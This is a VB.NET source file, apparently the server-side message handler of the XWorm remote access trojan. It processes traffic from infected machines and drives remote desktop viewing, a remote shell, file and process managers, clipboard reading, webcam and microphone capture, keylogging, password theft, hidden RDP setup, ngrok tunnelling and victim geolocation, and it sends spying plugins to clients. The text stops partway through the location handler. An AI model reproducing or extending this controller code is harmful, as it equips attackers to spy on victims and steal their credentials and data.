Imports System.IO
Imports System.IO.Compression
Imports GMap.NET
Imports GMap.NET.MapProviders
Imports GMap.NET.WindowsForms
Imports GMap.NET.WindowsForms.Markers

Public Class Messages

    Public Shared F As Form1
    Delegate Sub _Read(ByVal C As Client, ByVal b() As Byte)
    Public Shared GetCountry As GeoIP = New GeoIP((Application.StartupPath & "\GeoIP.dat"))



    Public Shared Sub Read(ByVal C As Client, ByVal b() As Byte)
        Try
            Dim A As String() = Split(BS(AES_Decryptor(b, C)), Settings.SPL)
            Select Case A(0)

                Case "INFO"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Try

                            For Each XX In Strings.Split(My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Block", Nothing), (","))
                                If XX.Contains(C.IP.ToString.Split(":")(0)) Or XX.Contains(A(1)) Then
                                    If Not Settings.Blocked.Contains(C.IP.ToString.Split(":")(0)) Then
                                        Settings.Blocked.Add(C.IP.ToString.Split(":")(0))
                                    End If
                                    C.isDisconnected()
                                    Return
                                End If
                            Next
                        Catch ex As Exception
                            Debug.WriteLine(ex.Message)
                        End Try

                        Try
                            C.LV = F.Lv1.Items.Insert(0, C.IP.Split(":")(0), GetCountry.LookupCountryCode(C.IP.Split(":")(0)) & ".png")
                            C.LV.Tag = C
                            C.LV.SubItems.Add(GetCountry.LookupCountryName(C.IP.Split(":")(0)))
                            For i As Integer = 1 To A.Length - 1
                                C.LV.SubItems.Add(A(i))
                            Next
                            F.Lv1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)



                            Settings.Online.Add(C)

                            log(C.IP.Split(":")(0), True)

                            If Settings.NOTEF = True Then
                                Form1.NotifyIcon1.BalloonTipTitle = "X-Worm"
                                Form1.NotifyIcon1.BalloonTipText = "Connected : " & C.IP.Split(":")(0)
                                Form1.NotifyIcon1.ShowBalloonTip(100)
                            End If

                        Catch ex As Exception
                            Debug.WriteLine(ex.Message)
                        End Try
                    End If
                    Exit Sub

                Case "RD-"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As RemoteDesktop = My.Application.OpenForms("Monitor : " + A(3))
                        If RD Is Nothing Then
                            RD = New RemoteDesktop
                            RD.C = C
                            RD.CID = A(3)
                            RD.Name = "Monitor : " + A(3)
                            RD.Text = "Monitor : " + A(3)
                            RD.Sz = New Size(A(1), A(2))
                            RD.Show()
                        End If
                    End If
                    Exit Sub

                Case "RD+"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As RemoteDesktop = My.Application.OpenForms("Monitor : " + A(4))
                        If RD IsNot Nothing Then
                            RD.Text = "Monitor : " + A(4) + " [" + BytesToString(b.LongLength) + "]"
                            Dim MM = Image.FromStream(New IO.MemoryStream(Text.Encoding.Default.GetBytes(A(1))))
                            RD.Sz = New Size(A(2), A(3))

                            RD.PictureBox1.Image = MM

                            If RD.ToolStripStatusLabel4.ForeColor = Color.Green Then
                                Try
                                    MM.Save(Application.StartupPath & "\Downloads" & "\" & A(4) & "\Monitor" & "\" & DateAndTime.Now.ToString("yyMMddhhmmssfff") & ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg)
                                Catch ex As Exception
                                    RD.ToolStripStatusLabel4.ForeColor = Color.White
                                End Try
                            End If


                            If RD.Button2.Text = "Capturing..." Then
                                If RD.ToolStripStatusLabel2.ForeColor = Color.Green Then
                                    If RD.op = Nothing Then
                                    Else
                                        Dim pp As New Point(0, 0)
                                        pp.X = RD.op.X
                                        pp.Y = RD.op.Y
                                        RD.op = Nothing
                                        Dim B2 As Byte() = SB("###" & Settings.SPL & pp.X & Settings.SPL & pp.Y & Settings.SPL)
                                        Try
                                            Dim ClientReq As New Outcoming_Requests(C, B2)
                                            Pending.Req_Out.Add(ClientReq)
                                        Catch ex As Exception
                                        End Try
                                    End If
                                End If
                                Dim Bb As Byte() = SB("RD+" + Settings.SPL + RD.PictureBox1.Width.ToString + Settings.SPL + RD.PictureBox1.Height.ToString + Settings.SPL + RD.ComboBox1.Text.Replace("%", "").ToString)
                                Try
                                    Dim ClientReq As New Outcoming_Requests(C, Bb)
                                    Pending.Req_Out.Add(ClientReq)
                                Catch ex As Exception
                                End Try
                            End If

                        End If
                    End If
                    Exit Sub



                Case "xxx"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As TEST = My.Application.OpenForms("Shell : " + A(1))
                        If RD Is Nothing Then
                            RD = New TEST
                            RD.C = C
                            RD.Name = "Shell : " + A(1)
                            RD.Text = "Shell : " + A(1)
                            RD.Show()
                        End If
                    End If
                    Exit Sub


                Case "R/"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As TEST = My.Application.OpenForms("Shell : " + A(2))
                        If RD IsNot Nothing Then
                            RD.Text = "Shell : " + A(2)
                            RD.TextBox2.Text &= (A(1))
                            RD.TextBox2.SelectionStart = RD.TextBox2.Text.Length
                            RD.TextBox2.ScrollToCaret()
                            RD.TextBox2.Refresh()
                        End If
                    End If
                    Exit Sub










                Case "ppp"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As ProcessV = My.Application.OpenForms("Process Manager : " + A(1))
                        If RD Is Nothing Then
                            RD = New ProcessV
                            RD.C = C
                            RD.Name = "Process Manager : " + A(1)
                            RD.Text = "Process Manager : " + A(1)
                            RD.Show()
                        End If
                    End If
                    Exit Sub


                Case "R#"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As ProcessV = My.Application.OpenForms("Process Manager : " + A(3))
                        If RD IsNot Nothing Then

                            RD.Text = "Process Manager : " + A(3)
                            RD.ListView1.Items.Clear()
                            Dim ProzessBundle() As String = Split(A(1), "*+*")
                            For Each ProzessBundleTeil As String In ProzessBundle
                                If ProzessBundleTeil <> "" Then
                                    Dim EndSplit() As String = Split(ProzessBundleTeil, "|+++|")
                                    Dim EndSplit2() As String = Split(ProzessBundleTeil, "|+++|")
                                    Dim li As New ListViewItem
                                    li.Text = EndSplit(0)
                                    li.SubItems.Add(EndSplit(1))
                                    li.SubItems.Add(EndSplit2(2))


                                    RD.ListView1.Items.Add(li)
                                End If
                            Next

                            For Each lvi As ListViewItem In RD.ListView1.Items

                                If lvi.SubItems(2).Text = A(2) Then
                                    lvi.ForeColor = Color.Red
                                End If

                            Next
                            RD.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                            RD.ListView1.Sorting = SortOrder.Ascending
                        End If
                    End If
                    Exit Sub









                Case "cbb"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As CB = My.Application.OpenForms("Clipboard : " + A(1))
                        If RD Is Nothing Then
                            RD = New CB
                            RD.C = C
                            RD.Name = "Clipboard : " + A(1)
                            RD.Text = "Clipboard : " + A(1)
                            RD.Show()
                        End If
                    End If
                    Exit Sub


                Case "R$"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As CB = My.Application.OpenForms("Clipboard : " + A(2))
                        If RD IsNot Nothing Then
                            RD.Text = "Clipboard : " + A(2)
                            RD.RichTextBox1.Text = ((A(1)))
                        End If
                    End If
                    Exit Sub













                    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''







                Case "|||"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As FM = My.Application.OpenForms("File Manager : " + A(1))
                        If RD Is Nothing Then
                            RD = New FM
                            RD.C = C
                            RD.Name = "File Manager : " + A(1)
                            RD.Text = "File Manager : " + A(1)
                            RD.Show()
                        End If
                    End If
                    Exit Sub



                Case "txtttt"

                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As TXT = My.Application.OpenForms("Text Viewer : " + A(1))
                        If RD Is Nothing Then
                            RD = New TXT
                            RD.C = C
                            RD.Name = "Text Viewer : " + A(1)
                            RD.Text = "Text Viewer : " + A(1)
                            RD.Show()
                        End If
                        Try
                            Dim RD1 As TXT = My.Application.OpenForms("Text Viewer : " + A(1))
                            RD1.Text = "Text Viewer : " + A(1)
                            RD1.TextBox1.Text = A(2)
                            RD1.TextBox2.Text = A(3)
                        Catch ex As Exception
                        End Try
                    End If





                Case "viewimage"
                    Dim RD As FM = My.Application.OpenForms("File Manager : " + A(1))
                    Try

                        Dim MM = New IO.MemoryStream(Text.Encoding.Default.GetBytes(A(2)))
                        RD.PictureBox1.Image = Image.FromStream(MM)
                        MM.Dispose()
                    Catch ex As Exception
                    End Try


                Case "downloadedfile"
                    If Not IO.Directory.Exists(Application.StartupPath & "\Downloads") Then
                        IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads")
                    End If
                    If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & A(3)) Then
                        IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & A(3))
                    End If

                    Try
                        IO.File.WriteAllBytes(Application.StartupPath & "\Downloads" & "\" & A(3) & "\" & A(2), Convert.FromBase64String(A(1)))
                        If Settings.NOTEF = True Then
                            Form1.NotifyIcon1.BalloonTipTitle = "X-Worm"
                            Form1.NotifyIcon1.BalloonTipText = "File Downloaded Successfully : " + A(2)
                            Form1.NotifyIcon1.ShowBalloonTip(100)
                        End If
                    Catch ex As Exception
                    End Try
















                Case "FileManager"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As FM = My.Application.OpenForms("File Manager : " + A(1))
                        If RD IsNot Nothing Then
                            RD.Text = "File Manager : " + A(1)
                            If A(2) = "Error" Then
                                RD.Button1.PerformClick()
                            Else
                                RD.ListView1.Items.Clear()
                                Dim allFiles As String() = Split(A(2), "FileManagerSplit")
                                For i = 0 To allFiles.Length - 2
                                    Dim itm As New ListViewItem
                                    itm.Text = allFiles(i)
                                    itm.SubItems.Add(allFiles(i + 1))
                                    If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") And Not itm.Text.StartsWith("[USB]") And Not itm.Text.StartsWith("[NET]") Then
                                        Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                        itm.SubItems(1).Text = BytesToString(fsize)
                                        itm.Tag = Convert.ToInt64(allFiles(i + 1))
                                    End If


                                    itm.ImageIndex = 5
                                    If itm.Text.StartsWith("[Drive]") Then
                                        itm.ImageIndex = 1
                                        itm.Text = itm.Text.Substring(7)
                                    ElseIf itm.Text.StartsWith("[CD]") Then
                                        itm.ImageIndex = 0
                                        itm.Text = itm.Text.Substring(4)
                                    ElseIf itm.Text.StartsWith("[USB]") Then
                                        itm.ImageIndex = 4
                                        itm.Text = itm.Text.Substring(5)
                                    ElseIf itm.Text.StartsWith("[Folder]") Then
                                        itm.ImageIndex = 2
                                        itm.Text = itm.Text.Substring(8)
                                    ElseIf itm.Text.StartsWith("[NET]") Then
                                        itm.ImageIndex = 3
                                        itm.Text = itm.Text.Substring(5)


                                    End If
                                    RD.ListView1.Items.Add(itm)
                                    i += 1
                                Next
                                RD.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                            End If
                        End If
                    End If
                    Exit Sub




                Case "PRG"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As Programs = My.Application.OpenForms("Installed Programs : " + A(1))
                        If RD Is Nothing Then
                            RD = New Programs
                            RD.C = C
                            RD.Name = "Installed Programs : " + A(1)
                            RD.Text = "Installed Programs : " + A(1)
                            RD.Show()
                        End If
                    End If
                    Exit Sub


                Case "P@"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As Programs = My.Application.OpenForms("Installed Programs : " + A(2))
                        If RD IsNot Nothing Then
                            RD.Text = "Installed Programs : " + A(2)
                            Try
                                Dim allProcesss As String() = Split(A(1), "ProcessSplit")
                                For Each x In allProcesss
                                    If Not x = "" Then

                                        Dim itm As New ListViewItem
                                        Dim xx As String() = Split(x, "|")

                                        If xx(0) = Nothing Then
                                        Else
                                            itm.Text = xx(0)
                                            itm.SubItems.Add((xx(1)))
                                            RD.ListView1.Items.Add(itm)
                                        End If
                                    End If
                                Next
                                RD.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                            Catch ex As Exception
                            End Try
                        End If
                    End If
                    Exit Sub



                Case "WBCM"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As WebCam = My.Application.OpenForms("WebCam : " + A(2))
                        If RD Is Nothing Then
                            RD = New WebCam
                            RD.C = C
                            RD.CID = A(2)
                            RD.Name = "WebCam : " + A(2)
                            RD.Text = "WebCam : " + A(2)
                            For Each XX In Strings.Split(A(1), ("|"))
                                If Not XX = Nothing Then
                                    RD.ComboBox2.Items.Add(XX)
                                End If
                            Next
                            RD.ComboBox2.SelectedIndex += 1
                            RD.Show()
                        End If
                    End If
                    Exit Sub


                Case "Cam"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As WebCam = My.Application.OpenForms("WebCam : " + A(2))
                        If RD IsNot Nothing Then

                            RD.Text = "WebCam : " + A(2) + " [" + BytesToString(b.LongLength) + "]"

                            Dim MM = New IO.MemoryStream(Text.Encoding.Default.GetBytes(A(1)))

                            RD.PictureBox1.Image = Image.FromStream(MM)

                            If RD.ToolStripStatusLabel4.ForeColor = Color.Green Then
                                RD.save(MM)
                            End If


                            If RD.Button1.Text = "Stop" Then
                                Dim Bx As Byte() = SB("Cam" + Settings.SPL + RD.ComboBox2.SelectedIndex.ToString + Settings.SPL + RD.ComboBox1.Text.Replace("%", "").ToString)
                                Try
                                    Dim ClientReq As New Outcoming_Requests(C, Bx)
                                    Pending.Req_Out.Add(ClientReq)
                                Catch ex As Exception
                                End Try
                            End If

                        End If
                    End If
                    Exit Sub










                Case "KLget"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As Keylogger = My.Application.OpenForms("Keylogger : " + A(1))
                        If RD Is Nothing Then
                            RD = New Keylogger
                            RD.C = C
                            RD.CID = A(1)
                            RD.Name = "Keylogger : " + A(1)
                            RD.Text = "Keylogger : " + A(1)
                            RD.Show()
                        End If
                    End If
                    Exit Sub


                Case "KLGET"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As Keylogger = My.Application.OpenForms("Keylogger : " + A(2))
                        If RD IsNot Nothing Then
                            RD.Text = "Keylogger : " + A(2)

                            RD.T1.Clear()

                            If (A(1)) = Nothing Then
                                RD.ToolStripStatusLabel1.ForeColor = Color.Red
                                RD.ToolStripStatusLabel1.Text = "Nothing!"
                                Return
                            End If


                            RD.T1.Text = (A(1))

                            RD.ToolStripStatusLabel1.ForeColor = Color.Green
                            RD.ToolStripStatusLabel1.Text = "Size [" + BytesToString(b.LongLength) + "]"
                            RD.T1.SelectionStart = RD.T1.Text.Length
                            RD.T1.ScrollToCaret()
                            RD.T1.Refresh()
                        End If
                    End If
                    Exit Sub

                Case "TCPV"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As TcpConnectionForm = My.Application.OpenForms("TCP Connections : " + A(1))
                        If RD Is Nothing Then
                            RD = New TcpConnectionForm
                            RD.C = C
                            RD.Name = "TCP Connections : " + A(1)
                            RD.Text = "TCP Connections : " + A(1)
                            RD.Show()
                        End If
                    End If
                    Exit Sub

                Case "TCPG"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As TcpConnectionForm = My.Application.OpenForms("TCP Connections : " + A(3))
                        If RD IsNot Nothing Then
                            RD.Text = "TCP Connections : " + A(3)
                            RD.ListView1.Items.Clear()
                            Dim out As String = A(1)
                            Dim _NextProc As String() = out.Split({"-=>"}, StringSplitOptions.None)

                            For i As Integer = 0 To _NextProc.Length - 1

                                If _NextProc(i).Length > 0 Then
                                    Dim lv As ListViewItem = New ListViewItem With {
                        .Text = Path.GetFileName(_NextProc(i))
                    }
                                    lv.SubItems.Add(_NextProc(i + 1))
                                    lv.SubItems.Add(_NextProc(i + 2))
                                    lv.SubItems.Add(_NextProc(i + 3))
                                    lv.ToolTipText = _NextProc(i)
                                    RD.ListView1.Items.Add(lv)
                                End If

                                i += 3
                            Next

                            For Each lvi As ListViewItem In RD.ListView1.Items
                                If lvi.SubItems(0).Text = A(2) Then
                                    lvi.ForeColor = Color.Red
                                End If
                            Next

                            RD.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                            RD.ListView1.Sorting = SortOrder.Ascending
                        End If
                    End If
                    Exit Sub




                Case "ACT"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As ACT = My.Application.OpenForms("ActiveWindows : " + A(1))
                        If RD Is Nothing Then
                            RD = New ACT
                            RD.C = C
                            RD.Name = "ActiveWindows : " + A(1)
                            RD.Text = "ActiveWindows : " + A(1)
                            RD.Show()
                        End If
                    End If
                    Exit Sub


                Case "ACTG"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As ACT = My.Application.OpenForms("ActiveWindows : " + A(1))
                        If RD IsNot Nothing Then
                            RD.Text = "ActiveWindows : " + A(1)


                            Dim li As New ListViewItem
                            li.Text = Strings.Split(A(2), "|+++W|||")(1)
                            li.SubItems.Add(Strings.Split(A(2), "|+++W|||")(0))
                            RD.ListView1.Items.Add(li)


                            RD.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                            RD.ListView1.Sorting = SortOrder.Ascending
                        End If
                    End If
                    Exit Sub
                Case "ENBC"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As ACT = My.Application.OpenForms("ActiveWindows : " + A(1))
                        RD.RefreshToolStripMenuItem.Enabled = True
                        RD.KillToolStripMenuItem.Enabled = True
                    End If
                    Exit Sub
                Case "Ref"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As ACT = My.Application.OpenForms("ActiveWindows : " + A(1))
                        RD.re()
                    End If
                    Exit Sub












                Case "getinfo"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As INFO = My.Application.OpenForms("Information : " + A(1))
                        If RD Is Nothing Then
                            RD = New INFO
                            RD.C = C
                            RD.CID = A(1)
                            RD.Name = "Information : " + A(1)
                            RD.Text = "Information : " + A(1)
                            RD.Show()
                        End If
                    End If
                    Exit Sub


                Case "Xinfo"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As INFO = My.Application.OpenForms("Information : " + A(2))
                        If RD IsNot Nothing Then

                            RD.Text = "Information : " + A(2)

                            If A(1) = Nothing Then
                                RD.ToolStripStatusLabel1.ForeColor = Color.Red
                                RD.ToolStripStatusLabel1.Text = "Error!"
                                Return
                            End If

                            RD.TextBox1.Text = (A(1))
                            RD.TextBox1.SelectionStart = RD.TextBox1.Text.Length
                            RD.TextBox1.ScrollToCaret()
                            RD.TextBox1.Refresh()
                            RD.ToolStripStatusLabel1.ForeColor = Color.Green
                            RD.ToolStripStatusLabel1.Text = "Successfully!"
                        End If
                    End If
                    Exit Sub


















                Case "ngrok"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As ngrok = My.Application.OpenForms("Ngrok Installer : " + A(1))
                        If RD Is Nothing Then
                            RD = New ngrok
                            RD.C = C
                            RD.Name = "Ngrok Installer : " + A(1)
                            RD.Text = "Ngrok Installer : " + A(1)
                            RD.Show()
                        End If
                    End If
                    Exit Sub



                Case "InstallngC"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As ngrok = My.Application.OpenForms("Ngrok Installer : " + A(1))
                        If RD IsNot Nothing Then
                            RD.Text = "Ngrok Installer : " + A(1)
                            RD.Button2.Enabled = True
                            RD.ToolStripStatusLabel1.ForeColor = Color.Green
                            RD.ToolStripStatusLabel1.Text = "Installed Successfully!"
                        End If
                    End If
                    Exit Sub




                Case "hrdp"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As HRDPST = My.Application.OpenForms("Hidden RDP : " + A(1))
                        If RD Is Nothing Then
                            RD = New HRDPST
                            RD.C = C
                            RD.Name = "Hidden RDP : " + A(1)
                            RD.Text = "Hidden RDP : " + A(1)
                            RD.Show()
                        End If
                    End If
                    Exit Sub


                Case "hrdp+"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As HRDPST = My.Application.OpenForms("Hidden RDP : " + A(2))
                        If RD IsNot Nothing Then

                            RD.Label1.Visible = False
                            RD.Label2.Visible = False
                            RD.TextBox1.Visible = False
                            RD.TextBox2.Visible = False
                            RD.Button2.Visible = False

                            If A(1) = Nothing Then
                                RD.ToolStripStatusLabel1.ForeColor = Color.Red
                                RD.ToolStripStatusLabel1.Text = "Error!"
                                Return
                            End If

                            RD.ToolStripStatusLabel1.ForeColor = Color.Green
                            RD.ToolStripStatusLabel1.Text = "Installed Successfully!"

                            RD.TextBox3.Text = A(1)
                            RD.TextBox3.Visible = True

                        End If
                    End If
                    Exit Sub






















                Case "PassR"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As PassR = My.Application.OpenForms("Password Recovery : " + A(1))
                        If RD Is Nothing Then
                            RD = New PassR
                            RD.C = C
                            RD.CID = A(1)
                            RD.Name = "Password Recovery : " + A(1)
                            RD.Text = "Password Recovery : " + A(1)
                            RD.Show()
                        End If
                    End If
                    Exit Sub


                Case "Getpass"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As PassR = My.Application.OpenForms("Password Recovery : " + A(1))
                        If RD IsNot Nothing Then
                            RD.Text = "Password Recovery : " + A(1)

                            If A(2) = "Error!" Then
                                RD.T1.Text = "This Feature Requires UAC Permissions!"
                                RD.ToolStripStatusLabel1.ForeColor = Color.Red
                                RD.ToolStripStatusLabel1.Text = "Error!"
                            Else
                                If A(2) = Nothing Then
                                    RD.ToolStripStatusLabel1.ForeColor = Color.Red
                                    RD.ToolStripStatusLabel1.Text = "Nothing!"
                                    Return
                                End If
                                RD.T1.Text = A(2)
                                RD.ToolStripStatusLabel1.ForeColor = Color.Green
                                RD.ToolStripStatusLabel1.Text = "Size [" + BytesToString(b.LongLength) + "]"
                                RD.T1.SelectionStart = RD.T1.Text.Length
                                RD.T1.ScrollToCaret()
                                RD.T1.Refresh()
                            End If

                        End If
                    End If
                    Exit Sub




                Case "MICCM"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As MIC = My.Application.OpenForms("MIC : " + A(2))
                        If RD Is Nothing Then
                            RD = New MIC
                            RD.C = C
                            RD.Name = "MIC : " + A(2)
                            RD.Text = "MIC : " + A(2)
                            For Each XX In Strings.Split(A(1), ("|"))
                                If Not XX = Nothing Then
                                    RD.ComboBox2.Items.Add(XX)
                                End If
                            Next
                            RD.ComboBox2.SelectedIndex += 1
                            Try
                                RD.waveplayer.Init(RD.bwp)
                                RD.waveplayer.Play()
                            Catch ex As Exception
                            End Try
                            RD.Show()
                        End If
                    End If
                    Exit Sub


                Case "MICGET"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As MIC = My.Application.OpenForms("MIC : " + A(3))
                        If RD IsNot Nothing Then
                            RD.ToolStripStatusLabel1.Text = "Size : " + " [" + BytesToString(b.LongLength) + "]"
                            Try
                                RD.bwp.AddSamples(smethod_5(Convert.FromBase64String(A(1)), False), 0, Convert.ToInt32(A(2)))
                                GC.Collect()
                            Catch ex As Exception
                            End Try

                        End If

                    End If






                Case "Xchat"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As Chat = My.Application.OpenForms("Chat : " + A(1))
                        If RD Is Nothing Then
                            RD = New Chat
                            RD.C = C
                            RD.Name = "Chat : " + A(1)
                            RD.Text = "Chat : " + A(1)
                            RD.chatE = False
                            RD.Show()
                        End If
                    End If
                    Exit Sub
                Case "ENCHAT"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As Chat = My.Application.OpenForms("Chat : " + A(1))
                        RD.C = C
                        RD.chatE = True
                        RD.Timer1.Enabled = True
                    End If
                    Exit Sub



                Case "Wchat"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As Chat = My.Application.OpenForms("Chat : " + A(1))
                        If RD IsNot Nothing Then
                            RD.Text = "Chat : " + A(1)
                            RD.TextBox2.Text &= (A(2))
                            RD.TextBox2.SelectionStart = RD.TextBox2.Text.Length
                            RD.TextBox2.ScrollToCaret()
                            RD.TextBox2.Refresh()
                            Console.Beep()
                        End If
                    End If
                    Exit Sub






                Case "PaSTIME"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As Fun = My.Application.OpenForms("Pastime : " + A(1))
                        If RD Is Nothing Then
                            RD = New Fun
                            RD.C = C
                            RD.Name = "Pastime : " + A(1)
                            RD.Text = "Pastime : " + A(1)
                            RD.Show()
                        End If
                    End If
                    Exit Sub













                Case "SysSound"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As Sound = My.Application.OpenForms("System Sound : " + A(1))
                        If RD Is Nothing Then
                            RD = New Sound
                            RD.C = C
                            RD.Name = "System Sound : " + A(1)
                            RD.Text = "System Sound : " + A(1)
                            Try
                                RD.waveplayer.Init(RD.bwp)
                                RD.waveplayer.Play()
                            Catch ex As Exception
                            End Try
                            RD.Show()
                        End If
                    End If
                    Exit Sub


                Case "SNDGet"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As Sound = My.Application.OpenForms("System Sound : " + A(3))
                        If RD IsNot Nothing Then
                            RD.ToolStripStatusLabel1.Text = "Size : " + " [" + BytesToString(b.LongLength) + "]"
                            Try
                                RD.bwp.AddSamples(smethod_5(Convert.FromBase64String(A(1)), False), 0, Convert.ToInt32(A(2)))
                                GC.Collect()
                            Catch ex As Exception
                            End Try

                        End If

                    End If

                Case "GETWCamPlu"
                    Dim B2 As Byte() = SB("WBCM" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\WebCam.dll")))
                    Try
                        Dim ClientReq As New Outcoming_Requests(C, B2)
                        Pending.Req_Out.Add(ClientReq)
                    Catch ex As Exception
                    End Try


                Case "GETWmicPlu"
                    Dim B2 As Byte() = SB("MICL" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Microphone.dll")))
                    Try
                        Dim ClientReq As New Outcoming_Requests(C, B2)
                        Pending.Req_Out.Add(ClientReq)
                    Catch ex As Exception
                    End Try

                Case "GETWsoundPlu"

                    Dim B2 As Byte() = SB("Wsound" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\WSound.dll")))
                    Try
                        Dim ClientReq As New Outcoming_Requests(C, B2)
                        Pending.Req_Out.Add(ClientReq)
                    Catch ex As Exception
                    End Try





                Case "maps"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As Maps = My.Application.OpenForms("Location Manager : " + A(1))
                        If RD Is Nothing Then
                            RD = New Maps
                            RD.C = C
                            RD.Name = "Location Manager : " + A(1)
                            RD.Text = "Location Manager : " + A(1)
                            RD.Show()
                        End If
                    End If
                    Exit Sub


                Case "GMapsapi"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As Maps = My.Application.OpenForms("Location Manager : " + A(1))
                        If RD IsNot Nothing Then
                            RD.Text = "Location Manager : " + A(1)
                        End If

                        If A(2) = Nothing Then
                            RD.ToolStripStatusLabel1.ForeColor = Color.Red
                            RD.ToolStripStatusLabel1.Text = "Error!"
                            Return
                        End If

